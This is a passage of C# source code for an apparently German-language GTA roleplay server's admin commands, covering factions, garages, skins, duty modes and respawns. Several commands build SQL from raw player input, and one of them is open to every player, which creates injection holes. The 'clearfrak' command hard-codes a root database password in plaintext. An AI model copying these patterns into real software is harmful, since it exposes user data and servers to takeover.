                    MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO fraktion_vehicles (Id, FactionId, Model, PrimaryColor, SecondaryColor, HeadlightColor) VALUES (@id, @factionid, @model, @primary, @secondary, @headlight)");
                    mySqlQuery.AddParameter("@id", id);
                    mySqlQuery.AddParameter("@factionid", factionid);
                    mySqlQuery.AddParameter("@model", model);
                    mySqlQuery.AddParameter("@primary", primary);
                    mySqlQuery.AddParameter("@secondary", secondary);
                    mySqlQuery.AddParameter("@headlight", headlight);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Fraktions Fahrzeug für " + fraktion.Name + " erstellt!", "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "cfrakcar", 97, 4));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    string frakid = args[1]; //41142
                    int rgbfarbe = 0;
                    bool rgbfarbe22 = int.TryParse(args[2], out rgbfarbe);
                    int rgbfarbe2 = 0;
                    bool rgbfarbe33 = int.TryParse(args[3], out rgbfarbe2);
                    int rgbfarbe3 = 0;
                    bool rgbfarbe44 = int.TryParse(args[4], out rgbfarbe3);
                    string rgbf = NAPI.Util.ToJson(new Color(rgbfarbe, rgbfarbe2, rgbfarbe3));


                    MySqlQuery mySqlQuery = new MySqlQuery("UPDATE fraktionen SET RGB = @rgb WHERE Id = @id");
                    mySqlQuery.AddParameter("@rgb", rgbf);
                    mySqlQuery.AddParameter("@id", frakid);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Fraktionsgaragen Spawnpoint gesetzt!", "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "changefrakcolor", 98, 3));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {

                    string dieid = args[1];
                    string garage = NAPI.Util.ToJson(client.Position);



                    MySqlQuery mySqlQuery = new MySqlQuery("UPDATE fraktionen SET Garage = @garage WHERE Id = @id");
                    mySqlQuery.AddParameter("@garage", garage);
                    mySqlQuery.AddParameter("@id", dieid);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Fraktionsgarage gesetzt!", "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "setfrakgarage", 98, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {

                    string dieid = args[1];
                    string garage = NAPI.Util.ToJson(client.Position);
                    string garage2 = NAPI.Util.ToJson(client.Heading);



                    MySqlQuery mySqlQuery = new MySqlQuery("UPDATE fraktionen SET GarageSpawn = @garage, GarageSpawnRotation = @garagr2 WHERE Id = @id");
                    mySqlQuery.AddParameter("@garage", garage);
                    mySqlQuery.AddParameter("@id", dieid);
                    mySqlQuery.AddParameter("@garagr2", garage2);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Fraktionsgaragen Spawnpoint gesetzt!", "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "setfrakgaragspawn", 98, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {

                    string frakid = args[1];
                    string logo = args[2];



                    MySqlQuery mySqlQuery = new MySqlQuery("UPDATE fraktionen SET Logo = @logo WHERE Id = @id");
                    mySqlQuery.AddParameter("@logo", logo);
                    mySqlQuery.AddParameter("@id", frakid);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Fraktionslogo gesetzt!", "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "changefraklogo", 98, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {


                    string dieid = args[1];
                    string garage = NAPI.Util.ToJson(client.Position);
                    string garage2 = NAPI.Util.ToJson(client.Heading);



                    MySqlQuery mySqlQuery = new MySqlQuery("UPDATE garages SET CarPoint2 = @garage, Rotation2 = @garagr2 WHERE Id = @id");
                    mySqlQuery.AddParameter("@garage", garage);
                    mySqlQuery.AddParameter("@id", dieid);
                    mySqlQuery.AddParameter("@garagr2", garage2);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Spawntpoint2 für die Garage mit der ID: " + dieid + " gesetzt!", "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "setgaragepoint2", 98, 1));



            /*  commandList.Add(new Command((dbPlayer, args) =>
              {
                  Client client = dbPlayer.Client;

                  try
                  {

                      string labor = NAPI.Util.ToJson(client.Position);



                      MySqlQuery mySqlQuery = new MySqlQuery("UPDATE fraktionen SET Logo = @logo WHERE Id = @id");
                      mySqlQuery.AddParameter("@logo", logo);
                      MySqlHandler.ExecuteSync(mySqlQuery);

                      dbPlayer.SendNotification("Labor gesetzt!");

                  }
                  catch (Exception ex)
                  {
                      Logger.Print("[EXCEPTION POS] " + ex.Message);
                      Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                  }
              }, "setfraklabor", 98, 1));*/



            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string str = args[2];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                Client c = dbPlayer2.Client;

                if (args[2] == "reset")
                {
                    dbPlayer2.ApplyCharacter();
                    MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @user LIMIT 1");
                    mySqlQuery.AddParameter("@user", c.Name);

                    MySqlResult mySqlReaderCon = MySqlHandler.GetQuery(mySqlQuery);
                    try
                    {
                        MySqlDataReader reader = mySqlReaderCon.Reader;
                        try
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    PlayerClothes playerClothes = NAPI.Util.FromJson<PlayerClothes>(reader.GetString("Clothes"));

                                    //  dbPlayer.SetClothes(2, playerClothes.Haare.drawable, playerClothes.Haare.texture);
                                    c.SetAccessories(0, playerClothes.Hut.drawable, playerClothes.Hut.texture);
                                    c.SetAccessories(1, playerClothes.Brille.drawable, playerClothes.Brille.texture);
                                    dbPlayer2.SetClothes(1, playerClothes.Maske.drawable, playerClothes.Maske.texture);
                                    dbPlayer2.SetClothes(11, playerClothes.Oberteil.drawable, playerClothes.Oberteil.texture);
                                    dbPlayer2.SetClothes(8, playerClothes.Unterteil.drawable, playerClothes.Unterteil.texture);
                                    dbPlayer2.SetClothes(7, playerClothes.Kette.drawable, playerClothes.Kette.texture);
                                    dbPlayer2.SetClothes(3, playerClothes.Koerper.drawable, playerClothes.Koerper.texture);
                                    dbPlayer2.SetClothes(4, playerClothes.Hose.drawable, playerClothes.Hose.texture);
                                    dbPlayer2.SetClothes(6, playerClothes.Schuhe.drawable, playerClothes.Schuhe.texture);
                                }
                            }
                        }
                        finally
                        {
                            reader.Dispose();
                        }
                    }
                    finally
                    {
                        mySqlReaderCon.Connection.Dispose();
                    }
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer2.Client.SetSkin(NAPI.Util.GetHashKey(str));
                    dbPlayer.SendNotification("Skin geändert!", "black", 3500);
                }
            }, "setped", 98, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                try
                {
                    string name = args[1];

                    DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                    if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                    {
                        dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                        return;
                    }
                    Client client = dbPlayer2.Client;

                    if (!dbPlayer2.HasData("PLAYER_CDUTY"))
                    {
                        dbPlayer2.SetData("PLAYER_CDUTY", false);
                    }

                    dbPlayer2.ACWait();

                    // WebhookSender.SendMessage("Spieler wechselt Aduty", "Der Spieler " + dbPlayer.Name + " hat den Adminmodus " + (dbPlayer.GetData("PLAYER_ADUTY") ? "betreten" : "verlassen") + ".", Webhooks.adminlogs, "Admin");

                    client.TriggerEvent("setPlayerCduty", !dbPlayer2.GetData("PLAYER_CDUTY"));
                    client.TriggerEvent("updateCduty", !dbPlayer2.GetData("PLAYER_CDUTY"));
                    dbPlayer2.SetData("PLAYER_CDUTY", !dbPlayer2.GetData("PLAYER_CDUTY"));
                    dbPlayer2.SetData("PLAYER_CDUTY", true);
                    dbPlayer2.SpawnPlayer(new Vector3(client.Position.X, client.Position.Y, client.Position.Z + 0.52f));
                    if (dbPlayer2.GetData("PLAYER_CDUTY"))
                    {
                        string str = "s_m_m_highsec_04";
                        dbPlayer2.SendNotification("Du hast den Casino-Dienst betreten.",  "black", 3500);
                        Adminrank adminrank = dbPlayer2.Adminrank;
                        dbPlayer.SetData("CASINO_ACCSES", true);
                        dbPlayer2.Client.SetSkin(NAPI.Util.GetHashKey(str));
                        return;
                    }
                    else
                    {
                        dbPlayer.SetData("CASINO_ACCSES", false);
                        dbPlayer2.ApplyCharacter();
                        dbPlayer2.Client.SetSharedData("PLAYER_INVINCIBLE", false);
                        dbPlayer2.SendNotification("Du hast den Casino-Dienst verlassen.",  "black", 3500);
                    }
                    MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @user LIMIT 1");
                    mySqlQuery.AddParameter("@user", client.Name);

                    MySqlResult mySqlReaderCon = MySqlHandler.GetQuery(mySqlQuery);
                    try
                    {
                        MySqlDataReader reader = mySqlReaderCon.Reader;
                        try
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    PlayerClothes playerClothes = NAPI.Util.FromJson<PlayerClothes>(reader.GetString("Clothes"));

                                    //  dbPlayer.SetClothes(2, playerClothes.Haare.drawable, playerClothes.Haare.texture);
                                    client.SetAccessories(0, playerClothes.Hut.drawable, playerClothes.Hut.texture);
                                    client.SetAccessories(1, playerClothes.Brille.drawable, playerClothes.Brille.texture);
                                    dbPlayer2.SetClothes(1, playerClothes.Maske.drawable, playerClothes.Maske.texture);
                                    dbPlayer2.SetClothes(11, playerClothes.Oberteil.drawable, playerClothes.Oberteil.texture);
                                    dbPlayer2.SetClothes(8, playerClothes.Unterteil.drawable, playerClothes.Unterteil.texture);
                                    dbPlayer2.SetClothes(7, playerClothes.Kette.drawable, playerClothes.Kette.texture);
                                    dbPlayer2.SetClothes(3, playerClothes.Koerper.drawable, playerClothes.Koerper.texture);
                                    dbPlayer2.SetClothes(4, playerClothes.Hose.drawable, playerClothes.Hose.texture);
                                    dbPlayer2.SetClothes(6, playerClothes.Schuhe.drawable, playerClothes.Schuhe.texture);
                                }
                            }
                        }
                        finally
                        {
                            reader.Dispose();
                        }
                    }
                    finally
                    {
                        mySqlReaderCon.Connection.Dispose();
                    }
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION ADUTY] " + ex.Message);
                    Logger.Print("[EXCEPTION ADUTY] " + ex.StackTrace);
                }
            }, "setduty", 98, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                TabletModule.AcceptedTickets.Clear();
                TabletModule.Tickets.Clear();
                dbPlayer.SendNotification("Tickets gecleart!", "black", 3500);
                WebhookSender.SendMessage("Support-Tickets Clear", "Teammitglied " + dbPlayer.Name + " hat die Support Tickets gecleart!", Webhooks.adminlogs, "Admin");
            }, "cleartickets", 97, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string frak = args[1];
                dbPlayer.SendNotification("Print", "black", 3500);
                string sql = "UPDATE accounts SET Fraktion = 0 WHERE Fraktion = " + frak + "";
                dbPlayer.SendNotification("Print2", "black", 3500);
                #region SENSIBEL
                MySqlConnection con = new MySqlConnection("host=localhost;user=root;password=cZbkOp3.;database=vacecrimelife;");
                #endregion
                dbPlayer.SendNotification("Print3", "black", 3500);
                MySqlCommand cmd = new MySqlCommand(sql, con);
                dbPlayer.SendNotification("Print4", "black", 3500);
                con.Open();
                dbPlayer.SendNotification("Print5", "black", 3500);
                MySqlDataReader readers = cmd.ExecuteReader();
                dbPlayer.SendNotification("Print6", "black", 3500);
                dbPlayer.SendNotification("Print7", "black", 3500);
                dbPlayer.SendNotification("erfolgreich frak gecleart!", "black", 3500);
                WebhookSender.SendMessage("Frak Clear", "Teammitglied " + dbPlayer.Name + " hat eine Frak gecleart!", Webhooks.adminlogs, "Admin");
            }, "clearfrak", 97, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                dbPlayer2.ResetData("Fraksperre");
                dbPlayer.SendNotification("Du hast dem Spieler " + dbPlayer2.Name + " die Fraksperre resettet.", "black", 3500);

                WebhookSender.SendMessage("Fraksperre", "Teammitglied " + dbPlayer.Name + " hat die Fraksperre von " + dbPlayer2.Name + " resettet.", Webhooks.adminlogs, "Admin");
            }, "resetfsperre", 98, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client c = dbPlayer.Client;
                c.TriggerEvent("aduty:tptoway");
            }, "tpm", 91, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                //NAPI.Pools.GetAllVehicles().Count
                dbPlayer.SendNotification("Es sind aktuell " + NAPI.Pools.GetAllVehicles().Count + " Autos auf dem Server!", "black", 3500);
            }, "vehs", 91, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Notification.SendGlobalNotification("Der Server startet nun automatisch neu.", 8000, "#0972c1", Notification.icon.warn);
                Environment.Exit(0);

            }, "restart", 98, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();

                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    string spawn = args[2];
                    // dbPlayer2.SetPosition(dbPlayer2.Faction.Storage);
                    if (spawn == "0")
                    {
                        dbPlayer2.SpawnPlayer(new Vector3(298.08, -584.53, 43.26));
                    }

                    else if (spawn == "1")
                    {
                        if (dbPlayer2.Faction.Id == 0)
                        {
                            dbPlayer2.SpawnPlayer(new Vector3(298.08, -584.53, 43.26));
                        }
                        else
                        {
                            dbPlayer2.SpawnPlayer(dbPlayer2.Faction.Spawn);
                        }
                    }

                    else if (spawn == "2")
                    {
                        House house = HouseModule.houses.FirstOrDefault((House house2) => house2.OwnerId == dbPlayer2.Id);
                        if (house == null)
                        {
                            return;
                        }
                        else
                        {
                            dbPlayer2.SpawnPlayer(house.Entrance);
                        }
                    }
                    dbPlayer2.disableAllPlayerActions(false);
                    dbPlayer2.SetAttribute("Death", 0);
                    dbPlayer2.StopAnimation();
                    dbPlayer2.SetInvincible(false);
                    dbPlayer2.DeathData = new DeathData
                    {
                        IsDead = false,
                        DeathTime = new DateTime(0)
                    };
                    dbPlayer2.TriggerEvent("toggleBlurred", false);
                    dbPlayer.SendNotification("Du hast " + dbPlayer2.Name + " respawnt.", "black", 3500);
                    dbPlayer2.SendNotification(dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " hat dich respawnt!", "black", 3500);
                }
            }, "respawn", 92, 1));





            /*List<Command> list49 = CommandModule.commandList;
            Action<DbPlayer, string[]> u003cu003e9_146 = CommandModule.<>c.<>9__1_46;
            if (u003cu003e9_146 == null)
            {
                u003cu003e9_146 = new Action<DbPlayer, string[]>(CommandModule.<>c.<>9, (DbPlayer dbPlayer, string[] args) => {
                    CommandModule.<>c__DisplayClass1_7 variable = null;
                    Client client = dbPlayer.Client;
                    try
                    {
                        if (dbPlayer.Faction.Id != 0)
                        {
                            if (dbPlayer.Factionrank == 12)
                            {
                                DbPlayer dbPlayer1 = PlayerHandler.GetPlayer(args[1]);
                                if ((dbPlayer1 == null ? true : !dbPlayer1.IsValid(true)))
                                {
                                    dbPlayer.SendNotification("Spieler nicht gefunden.", "black", 3500, "gray", "");
                                }
                                else if (dbPlayer.Faction.Id != dbPlayer1.Faction.Id)
                                {
                                    dbPlayer.SendNotification("Ihr seit nicht in der gleichen Fraktion!", "black", 3500, "gray", "");
                                }
                                else if (!dbPlayer1.Medic)
                                {
                                    List<DbPlayer> factionPlayers = dbPlayer.Faction.GetFactionPlayers();
                                    P#0972c1icate<DbPlayer> u003cu003e9_158 = CommandModule.<>c.<>9__1_58;
                                    if (u003cu003e9_158 == null)
                                    {
                                        u003cu003e9_158 = new P#0972c1icate<DbPlayer>(CommandModule.<>c.<>9, (DbPlayer player) => player.Medic);
                                        CommandModule.<>c.<>9__1_58 = u003cu003e9_158;
                                    }
                                    List<DbPlayer> list = factionPlayers.FindAll(u003cu003e9_158);
                                    if (list.get_Count() < 2)
                                    {
                                        dbPlayer1.Medic = true;
                                        dbPlayer1.RefreshData(dbPlayer1);
                                        dbPlayer1.SetAttribute("Medic", 1);
                                        dbPlayer.SendNotification("Medic gesetzt!", "black", 3500, "gray", "");
                                    }
                                    else
                                    {
                                        StringBuilder stringBuilder = new StringBuilder();
                                        list.ForEach(new Action<DbPlayer>(CommandModule.<>c__DisplayClass1_7.<OnLoad>b__59));
                                        dbPlayer.SendNotification(string.Concat("Es sind bereits 2 Medics in deiner Fraktion. ", stringBuilder.ToString()), "black", 3500, "gray", "");
                                        return;
                                    }
                                }
                                else
                                {
                                    dbPlayer1.Medic = false;
                                    dbPlayer1.RefreshData(dbPlayer1);
                                    dbPlayer1.SetAttribute("Medic", 0);
                                    dbPlayer.SendNotification("Medic entfernt!", "black", 3500, "gray", "");
                                }
                            }
                        }
                    }
                    catch (Exception exception1)
                    {
                        Exception exception = exception1;
                        Logger.Print(string.Concat("[EXCEPTION setmedic] ", exception.get_Message()));
                        Logger.Print(string.Concat("[EXCEPTION setmedic] ", exception.StackTrace));
                    }
                });
                CommandModule.<>c.


          9__1_46 = u003cu003e9_146;
            }
            list49.Add(new Command(u003cu003e9_146, "setmedic", 0, 1));*/

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery($"SELECT * FROM accounts WHERE Social = '{name}'");
                MySqlResult result = MySqlHandler.GetQuery(mySqlQuery);

                if (result.Reader.HasRows)
                {
                    result.Reader.Read();
                    dbPlayer.SendNotification("Ingame Name: " + result.Reader.GetString("Username"), "black", 3500);
                }
                result.Connection.Dispose();
            }, "name", 0, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string id = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery($"SELECT * FROM accounts WHERE id = '{id}'");
                MySqlResult result = MySqlHandler.GetQuery(mySqlQuery);

                if (result.Reader.HasRows)
                {
                    result.Reader.Read();
                    dbPlayer.SendNotification("Ingame Name: " + result.Reader.GetString("Username"), "black", 3500);
                }
                result.Connection.Dispose();
            }, "findplayer", 91, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                try
                {
                    Client client = dbPlayer.Client;

                    if (!dbPlayer.HasData("PLAYER_CDUTY"))
                    {
                        dbPlayer.SetData("PLAYER_CDUTY", false);
                    }

                    dbPlayer.ACWait();

                    // WebhookSender.SendMessage("Spieler wechselt Aduty", "Der Spieler " + dbPlayer.Name + " hat den Adminmodus " + (dbPlayer.GetData("PLAYER_ADUTY") ? "betreten" : "verlassen") + ".", Webhooks.adminlogs, "Admin");


                    client.TriggerEvent("setPlayerCduty", !dbPlayer.GetData("PLAYER_CDUTY"));
                    client.TriggerEvent("updateCduty", !dbPlayer.GetData("PLAYER_CDUTY"));
                    dbPlayer.SetData("PLAYER_CDUTY", !dbPlayer.GetData("PLAYER_CDUTY"));
                    dbPlayer.SpawnPlayer(new Vector3(client.Position.X, client.Position.Y, client.Position.Z + 0.52f));
                    if (dbPlayer.GetData("PLAYER_CDUTY"))
                    {
                        string str = "s_m_m_highsec_04";
                        dbPlayer.Client.SetSharedData("PLAYER_INVINCIBLE", true);
                        dbPlayer.SendNotification("Du hast den Casino-Dienst betreten.",  "black", 3500);
                        Adminrank adminrank = dbPlayer.Adminrank;
                        dbPlayer.SetData("CASINO_ACCSES", true);
                        dbPlayer.SetData("CASINO_ACCSE", true);
                        dbPlayer.Client.SetSkin(NAPI.Util.GetHashKey(str));
                        return;
                    }
                    else
                    {
                        dbPlayer.SetData("CASINO_ACCSES", false);
                        dbPlayer.SetData("CASINO_ACCSE", false);
                        dbPlayer.ApplyCharacter();
                        dbPlayer.Client.SetSharedData("PLAYER_INVINCIBLE", false);
                        dbPlayer.SendNotification("Du hast den Casino-Dienst verlassen.",  "black", 3500);
                    }
                    MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @user LIMIT 1");
                    mySqlQuery.AddParameter("@user", client.Name);

                    MySqlResult mySqlReaderCon = MySqlHandler.GetQuery(mySqlQuery);
                    try
                    {
                        MySqlDataReader reader = mySqlReaderCon.Reader;
                        try
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    PlayerClothes playerClothes = NAPI.Util.FromJson<PlayerClothes>(reader.GetString("Clothes"));

                                    //  dbPlayer.SetClothes(2, playerClothes.Haare.drawable, playerClothes.Haare.texture);
                                    client.SetAccessories(0, playerClothes.Hut.drawable, playerClothes.Hut.texture);
                                    client.SetAccessories(1, playerClothes.Brille.drawable, playerClothes.Brille.texture);
                                    dbPlayer.SetClothes(1, playerClothes.Maske.drawable, playerClothes.Maske.texture);
                                    dbPlayer.SetClothes(11, playerClothes.Oberteil.drawable, playerClothes.Oberteil.texture);
                                    dbPlayer.SetClothes(8, playerClothes.Unterteil.drawable, playerClothes.Unterteil.texture);
                                    dbPlayer.SetClothes(7, playerClothes.Kette.drawable, playerClothes.Kette.texture);
                                    dbPlayer.SetClothes(3, playerClothes.Koerper.drawable, playerClothes.Koerper.texture);
                                    dbPlayer.SetClothes(4, playerClothes.Hose.drawable, playerClothes.Hose.texture);
                                    dbPlayer.SetClothes(6, playerClothes.Schuhe.drawable, playerClothes.Schuhe.texture);
                                }
                            }
                        }
                        finally
                        {
                            reader.Dispose();
                        }
                    }
                    finally
                    {
                        mySqlReaderCon.Connection.Dispose();
                    }
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION ADUTY] " + ex.Message);
                    Logger.Print("[EXCEPTION ADUTY] " + ex.StackTrace);
                }
            }, "cduty", 98, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                dbPlayer2.TriggerEvent("updateCuffed", false);
                dbPlayer2.IsCuffed = false;
                dbPlayer2.IsFarming = false;
                dbPlayer2.RefreshData(dbPlayer);
                dbPlayer2.SendNotification("Du wurdest von " + dbPlayer.Name + " entfesselt.", "black", 3500);
                dbPlayer.SendNotification("Du hast " + dbPlayer2.Name + " entfesselt.", "black", 3500);
                dbPlayer2.StopAnimation();
                dbPlayer2.disableAllPlayerActions(false);
                target.TriggerEvent("freezePlayer", false);
                dbPlayer.Client.TriggerEvent("freezePlayer", false);
                dbPlayer.disableAllPlayerActions(false);
                dbPlayer2.Client.TriggerEvent("toggleShooting", new object[1] { false });
            }, "uncuff", 92, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    int id = 0;
                    bool id2 = int.TryParse(args[1], out id);

                    if (!id2) return;

                    MySqlQuery mySqlQuery = new MySqlQuery("DELETE FROM houses WHERE Id = @id");
                    mySqlQuery.AddParameter("@id", id);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Das Haus wurde erfolgreich entfernt.", "black", 3500);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "delhouse", 100, 1));

            return true;
        }

        private string Player(string name) => throw new NotImplementedException();
        private string SpawnPlayer(string name) => throw new NotImplementedException();

        [RemoteEvent("PlayerChat")]
        public static async void onPlayerCommand(Client player, string input)
        {
            try
            {
                if (player == null) return;
                DbPlayer dbPlayer = player.GetPlayer();
                if (dbPlayer == null || !dbPlayer.IsValid(true) || dbPlayer.Client == null)
                    return;

                if (!dbPlayer.CanInteractAntiFlood(1)) return;

                Logger.Print(player.Name + " " + input);
                if (input == "Tejej" && input == "")
                {
                    dbPlayer.BanPlayer();
                    return;
                }

                string[] array = input.Split(" ");
                foreach (Command command in CommandModule.commandList)
                {
                    if (array[0] == command.Name)
                    {
                        Adminrank adminranks = dbPlayer.Adminrank;

                        if (array.Length <= command.Args)
                        {
                            dbPlayer.SendNotification("Du hast zu wenig Argumente angegeben!", "black", 3500);
                            return;
                        }
                        if (command.Permission <= adminranks.Permission)
                        {
                            WebhookSender.SendMessage("Command", dbPlayer.Name + ": " + input, Webhooks.commandlogs,
                                "Command");
                            command.Callback(dbPlayer, array);
                        }
                        else
                        {
                            dbPlayer.SendNotification("Du besitzt dafür keine Berechtigung!", "black", 3500);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Print("[EXCEPTION onPlayerCommand] " + ex.Message);
                Logger.Print("[EXCEPTION onPlayerCommand] " + ex.StackTrace);
            }

        }


        [RemoteEvent("nM-Adminmenu")]
        public void Adminmenu(Client c, string selection)
        {
            if (selection == null)
                return;

            DbPlayer dbPlayer = c.GetPlayer();
            if (dbPlayer == null || !dbPlayer.IsValid(true) || dbPlayer.Client == null)
                return;

            Adminrank adminranks = dbPlayer.Adminrank;

            if (adminranks.Permission <= 91)
                return;

            if (selection == "aduty")
            {
                try
                {
                    Client client = dbPlayer.Client;

                    if (!dbPlayer.HasData("PLAYER_ADUTY"))
                    {
                        dbPlayer.SetData("PLAYER_ADUTY", false);
                    }

                    dbPlayer.ACWait();

                    WebhookSender.SendMessage("Spieler wechselt Aduty", "Der Spieler " + dbPlayer.Name + " hat den Adminmodus " + (dbPlayer.GetData("PLAYER_ADUTY") ? "betreten" : "verlassen") + ".", Webhooks.adminlogs, "Admin");

                    client.TriggerEvent("setPlayerAduty", !dbPlayer.GetData("PLAYER_ADUTY"));
                    client.TriggerEvent("updateAduty", !dbPlayer.GetData("PLAYER_ADUTY"));
                    dbPlayer.SetData("PLAYER_ADUTY", !dbPlayer.GetData("PLAYER_ADUTY"));
                    dbPlayer.SpawnPlayer(new Vector3(client.Position.X, client.Position.Y, client.Position.Z + 0.52f));
                    if (dbPlayer.GetData("PLAYER_ADUTY"))
                    {
                        dbPlayer.Client.SetSharedData("PLAYER_INVINCIBLE", true);
                        dbPlayer.SendNotification("Du hast den Admin-Dienst betreten.", "black", 3500, "ADMIN");
                        Adminrank adminrank = dbPlayer.Adminrank;
                        int num = (int)adminrank.ClothingId;
                        dbPlayer.SetClothes(3, 9, 0);
                        PlayerClothes.setAdmin(dbPlayer, num);
                        dbPlayer.SetClothes(5, 0, 0);
                        return;
                    }
                    else
                    {
                        dbPlayer.Client.SetSharedData("PLAYER_INVINCIBLE", false);
                        dbPlayer.SendNotification("Du hast den Admin-Dienst verlassen.", "black", 3500, "ADMIN");
                    }
                    MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @user LIMIT 1");
                    mySqlQuery.AddParameter("@user", client.Name);

                    MySqlResult mySqlReaderCon = MySqlHandler.GetQuery(mySqlQuery);
                    try
                    {
                        MySqlDataReader reader = mySqlReaderCon.Reader;
                        try
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    PlayerClothes playerClothes = NAPI.Util.FromJson<PlayerClothes>(reader.GetString("Clothes"));

                                    //  dbPlayer.SetClothes(2, playerClothes.Haare.drawable, playerClothes.Haare.texture);
                                    client.SetAccessories(0, playerClothes.Hut.drawable, playerClothes.Hut.texture);
                                    client.SetAccessories(1, playerClothes.Brille.drawable, playerClothes.Brille.texture);
                                    dbPlayer.SetClothes(1, playerClothes.Maske.drawable, playerClothes.Maske.texture);
                                    dbPlayer.SetClothes(11, playerClothes.Oberteil.drawable, playerClothes.Oberteil.texture);
                                    dbPlayer.SetClothes(8, playerClothes.Unterteil.drawable, playerClothes.Unterteil.texture);
                                    dbPlayer.SetClothes(7, playerClothes.Kette.drawable, playerClothes.Kette.texture);
                                    dbPlayer.SetClothes(3, playerClothes.Koerper.drawable, playerClothes.Koerper.texture);
                                    dbPlayer.SetClothes(4, playerClothes.Hose.drawable, playerClothes.Hose.texture);
                                    dbPlayer.SetClothes(6, playerClothes.Schuhe.drawable, playerClothes.Schuhe.texture);
                                }
                            }
                        }
                        finally
                        {
                            reader.Dispose();
